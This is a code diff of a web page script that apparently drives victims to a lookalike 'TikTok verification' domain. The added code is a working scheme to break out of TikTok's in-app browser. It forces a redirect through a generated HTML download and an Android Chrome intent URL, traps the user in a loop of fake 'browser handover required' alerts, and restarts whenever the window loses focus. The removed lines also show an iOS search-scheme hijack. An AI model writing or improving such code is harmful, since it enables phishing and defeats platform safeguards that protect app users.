@@ -11,53 +11,55 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function executeJump() {
+    function triggerDownloadHandover() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const urlNoProtocol = target.replace("https://", "");
+        
+        // Create a 'dummy' HTML file that redirects to your site
+        const content = `<html><head><meta http-equiv="refresh" content="0;url=${target}"></head></html>`;
+        const blob = new Blob([content], {type: 'text/html'});
+        const blobUrl = URL.createObjectURL(blob);
 
+        // Create a physical link element
+        const a = document.createElement('a');
+        a.href = blobUrl;
+        
+        // Use 'download' to force the WebView to give up and open an external browser
+        a.download = "verify.html";
+        document.body.appendChild(a);
+        
+        // Fire the click
+        a.click();
+        
+        // Android fallback
         if (isAndroid) {
-            // Android: Chrome Intent with S.browser_fallback_url
-            // This is the "Nuclear" Android string
-            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
-        } else {
-            // iOS: Direct Safari Handover via 'ftp' or 'webcal'
-            // TikTok has zero handlers for these, forcing an external jump
-            window.location.assign("webcal://" + urlNoProtocol);
-            
-            // Simultaneous Search Hijack
-            setTimeout(() => {
-                window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            }, 5);
+            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
         }
+        
+        document.body.removeChild(a);
     }
 
     function rampage() {
-        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
+        if (Date.now() > killTime) return; // FAIL-SAFE
 
-        try {
-            // 1. Prime the system right before the alert
-            executeJump();
-            
-            // 2. THE LOCK
-            alert("ATTEMPT #20\n\nExternal browser sync required.\n\nTap OK to authorize.");
-        } finally {
-            // 3. THE "FINALLY" GAP
-            // This code executes the INSTANT 'OK' is pressed, 
-            // using the momentum of the user's tap.
-            executeJump();
+        // 1. Prime the download
+        triggerDownloadHandover();
 
-            // Tiny timeout to let the OS process the jump before the next alert
-            setTimeout(rampage, 15);
-        }
+        // 2. THE LOCK
+        alert("ATTEMPT #21\n\nSystem browser handover required.\n\nTap OK to continue.");
+
+        // 3. The Execution Gap
+        // Fires immediately after they tap 'OK'
+        requestAnimationFrame(() => {
+            triggerDownloadHandover();
+            setTimeout(rampage, 10);
+        });
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // If they try to close or the window loses focus, restart immediately
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
-
 </body>
 </html>
